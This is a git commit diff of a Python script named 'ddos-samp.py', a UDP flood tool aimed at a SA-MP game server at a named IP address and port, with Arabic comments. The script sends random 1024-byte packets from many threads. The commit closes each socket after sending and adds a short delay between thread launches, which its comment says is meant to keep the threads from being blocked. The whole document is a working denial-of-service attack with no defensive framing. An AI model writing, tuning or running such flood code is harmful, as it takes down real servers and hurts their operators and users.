92f6569e27a3192f70e5c7b28b95b755365b81bd
mehdicimaa <mehdisniper4v5@gmail.com>
2025-01-10 01:02:29 +0100

    Add files via upload

--- ddos-samp.py
+++ ddos-samp.py
@@ -1,6 +1,7 @@
 import socket
 import threading
 import random
+import time
 
 target_ip = '23.88.73.88'  # حدد عنوان IP للسيرفر الهدف
 target_port = 16414  # حدد المنفذ الهدف (عادةً ما يكون 7777 لـ SAMP)
@@ -12,7 +13,9 @@ def attack():
         data = random._urandom(1024)
         addr = (str(target_ip), int(target_port))
         s.sendto(data, addr)
+        s.close()
 
 for i in range(num_threads):
     thread = threading.Thread(target=attack)
     thread.start()
+    time.sleep(0.1)  # إضافة تأخير بسيط لتجنب حظر الخيوط
